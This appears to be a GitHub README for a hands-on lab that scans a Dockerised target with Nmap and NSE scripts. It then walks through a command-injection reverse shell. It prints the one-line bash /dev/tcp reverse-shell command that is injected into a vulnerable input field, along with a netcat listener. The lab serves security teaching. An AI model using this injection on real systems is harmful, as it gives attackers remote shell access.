# Network-Scanning-Enumeration

## Objective

The main objective of this lab is to identify and collect information about systems, services, and network infrastructure in order to understand the target environment and identify potential security risks.

### Skills Learned

- Host discovery and network reconnaissance
- Service and version detection
- Operating system fingerprinting
- Network mapping and asset discovery
- Vulnerability identification using NSE scripts

### Tools Used

- Nmap for scanning
- And combine with NSE Script for find vulnerability

## Steps
=> **For this lab, the target server runs on Docker. Therefore, before starting, please ensure that Docker is installed on your machine**
1. Please clone the repository from this link: https://github.com/SamSothavy/Nmap_Folder.git
2. Open Dockter
3. Open the "Nmap_Folder" directory in VS Code (or another IDE)
4. Open a Terminal.
5. Navigate to the Nmap_Folder directory if you are not already in it.
6. Run the following command: "docker compose up --build"
7. After the Docker containers have started successfully, open a web browser and access the application using your machine's IP address or localhost.
   
   You should see a page similar to the following:
   <img width="2356" height="1200" alt="Screenshot 2026-06-25 194603" src="https://github.com/user-attachments/assets/d251f87b-1e4f-47da-8a14-8017796ebb4e" />

8. Enter the target IP address and perform a scan to determine how many ports are open.
   <img width="628" height="1010" alt="Screenshot 2026-06-25 212119" src="https://github.com/user-attachments/assets/a53d9c1d-94ae-4ced-9ba9-b4d3a9e2a28c" />

   The scan results show multiple open ports :
   
   Port 21 is commonly used for FTP (File Transfer Protocol).
   
   Port 22 is commonly used for SSH (Secure Shell).
   
   Port 80 is commonly used for HTTP (Hypertext Transfer Protocol)...etc

8. We can also determine which SSH version is running on the target system

   <img width="829" height="567" alt="Screenshot 2026-06-25 213340" src="https://github.com/user-attachments/assets/a7a28f15-fbc0-49b8-9b6f-6ff955ffd84c" />

9. We can use Nmap NSE (Nmap Scripting Engine) scripts to identify the features and authentication methods supported by the SSH service

   <img width="856" height="874" alt="Screenshot 2026-06-25 213752" src="https://github.com/user-attachments/assets/ae4ed5f6-504b-4299-b1ce-2ba2a0989719" />

=> **For this lab, we can also try a reverse shell to gain access to the target system.**

1. Navigate to the Try Vulnerable Lab Feature.
   <img width="2356" height="1200" alt="Screenshot 2026-06-25 194603" src="https://github.com/user-attachments/assets/8f3f1391-0412-471a-b851-d295c18e4eba" />
   
   After navigating to the Try Vulnerable Lab feature, you will see a screen like this.

   <img width="2357" height="1195" alt="Screenshot 2026-06-25 214454" src="https://github.com/user-attachments/assets/364822e8-20b3-44fa-a88a-3a7595873643" />
   
   Then, we use the **Hack-Tool** to generate a reverse shell script.
   **Note:** Make sure you know the operating system (OS) that the target system is using.

   <img width="884" height="859" alt="Screenshot 2026-06-25 215053" src="https://github.com/user-attachments/assets/3b544770-1df4-4a7b-881e-978db2a56322" />
   
   Then we copy the command `bash -c 'exec bash -i &>/dev/tcp/100.122.51.23/4444 <&1'` and URL-encode it, because the browser cannot properly handle raw input containing spaces and special characters.

   <img width="985" height="668" alt="Screenshot 2026-06-25 215609" src="https://github.com/user-attachments/assets/62245809-56ff-4718-8cf4-bdcbf8856538" />
   
   We then use Netcat to listen on port 4444 in order to receive the incoming connection from the target system.
   
   <img width="824" height="665" alt="Screenshot 2026-06-25 215819" src="https://github.com/user-attachments/assets/74445e81-5a6e-4fd1-91ca-8569b86a74c3" />
   
   Next, we insert the previously URL-encoded script into the input field or browser request.
   
   <img width="2354" height="735" alt="Screenshot 2026-06-25 215927" src="https://github.com/user-attachments/assets/acd323c5-9fed-41a0-836d-60419a8aedcd" />
   
   Finally, we successfully gained access to the target system.
   
   <img width="1005" height="623" alt="Screenshot 2026-06-25 220109" src="https://github.com/user-attachments/assets/065db379-b500-4891-84e6-67abeed946d8" />

 



   


   






